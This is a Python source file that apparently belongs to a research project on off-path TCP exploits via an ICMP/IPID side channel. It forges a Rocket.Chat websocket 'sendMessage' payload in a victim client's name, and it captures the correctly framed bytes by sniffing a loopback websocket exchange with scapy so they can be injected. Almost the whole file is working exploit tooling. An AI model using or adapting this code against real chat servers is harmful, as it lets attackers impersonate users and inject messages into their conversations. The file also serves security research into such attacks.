# encoding=utf-8

import threading
import time
import string
import json
import websockets
import asyncio
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *

"""
    @CreateDate:    2020/3/18
    @Group:         Off-Path TCP Exploit Via ICMP
                    and IPID Side-Channel
    @Project:       Work2
    @Filename:      websocket_gen.py
    @Brief:         This program is used for construct a forged websocket message to attack
                    Rocket.Chat which utilize websocket to implement real-time web application.
                    Construct one websocket websocket message is more difficult than SSH Rest
                    or BGP update message. Because websocket has its own masking rule and
                    data compression method.
                    To construct an acceptable websocket message, we establish a loopback
                    websocket application, send out the constructed json string via websocket
                    and sniff it, then take out of TCP payload, and return it to the main program.
    @Modify:        
"""


"""
    @Date:      2020/3/18
    @Author:    Kevin.F
    @Brief:     This is a loopback websocket application server.
"""
async def websocket_serv(websocket, path):
    name = await websocket.recv()
    greeting = "OK"
    await websocket.send(greeting)


def run_websocket_server():
    start_server = websockets.serve(websocket_serv, 'localhost', 7777)
    asyncio.get_event_loop().run_until_complete(start_server)


"""
    @Date:      2020/3/18
    @Author:    Kevin.F
    @Brief:     This is a loopback websocket application client.
"""
async def websocket_clin(msg):
    async with websockets.connect('ws://localhost:7777') as websocket:
        await websocket.send(msg)
        greeting = await websocket.recv()


def run_websocket_client(msg):
    asyncio.get_event_loop().run_until_complete(websocket_clin(msg))


"""
    @Date:      2020/3/18
    @Author:    Kevin.F
    @Brief:     We construct a forged json string here, which can inform Rocket.Chat server 
                the victim client is wanting to send message in certain chat room.
                Then we will use loopback websocket server to get websocket payload.
"""
def forge_rocket_chat_messege(forged_id, room_id, forged_message):
    dict = {}
    dict['msg'] = 'method'
    dict['method'] = 'sendMessage'

    sub_dict = {}
    sub_dict['_id'] = ''.join(random.sample(string.ascii_letters + string.digits, len('WXgEhQYrqQphda4NW')))
    sub_dict['rid'] = room_id
    sub_dict['msg'] = forged_message
    dict['params'] = [sub_dict]
    dict['id'] = str(forged_id)
    json_str = json.dumps(dict)
    warp_json_str = json.dumps([json_str])

    return warp_json_str


"""
    @Date:      2020/3/18
    @Author:    Kevin.F
    @Brief:     This is a interface function for getting websocket payload.
"""
def get_websocket_messege(forged_id=101, room_id='NGbsMyFhDp9n6JnEx', forged_message='forged message'):
    forge_msg = forge_rocket_chat_messege(forged_id, room_id, forged_message)

    t_server = threading.Thread(target=run_websocket_server)
    t_server.daemon = True
    t_server.run()

    pkts = sniff(filter="tcp and (dst port 7777) and tcp[13]=24",
                 iface='lo', count=3, timeout=1.5, started_callback=
                 lambda: run_websocket_client(forge_msg))

    return pkts[-1][3]
